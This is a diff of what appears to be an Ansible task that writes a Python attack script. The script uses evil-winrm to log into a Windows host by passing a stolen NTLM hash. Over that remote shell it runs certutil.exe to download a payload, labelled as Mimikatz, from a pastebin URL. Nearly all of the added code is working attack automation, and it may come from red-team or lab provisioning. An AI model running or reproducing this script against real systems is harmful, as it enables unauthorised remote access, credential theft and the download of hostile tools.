@@ -3,12 +3,28 @@
   copy:
     dest: /opt/pastebin.py
     content: |
-       import pexpect
-       import re
-       import json
-       import time
+      import pexpect
+      import re
+
+      target_ip = "{{ target_ip }}"
+      username = "{{ username }}"
+      hash = "{{ ntlm }}"
+
+      command = f"evil-winrm -i {target_ip} -u {username} -H {hash}"
+
+      upload_mimikatz="certutil.exe -urlcache -f https://pastebin.com/ayrHaaNp"
+
+      winrm=f'PS \x1b[0mC:\\Users\\{username}\\Documents> '
+      child = pexpect.spawn(command)
+      child.timeout = None
+      child.expect(re.escape(winrm))
+      child.sendline(upload_mimikatz)
+      child.expect(re.escape(winrm))
+      child.sendline("exit")
+      res = child.before + child.after
+      print(res)
        
-       upload_mimikatz="certutil.exe -urlcache -f https://pastebin.com/ayrHaaNp"
+      
        
 
 - name: Make the script executable
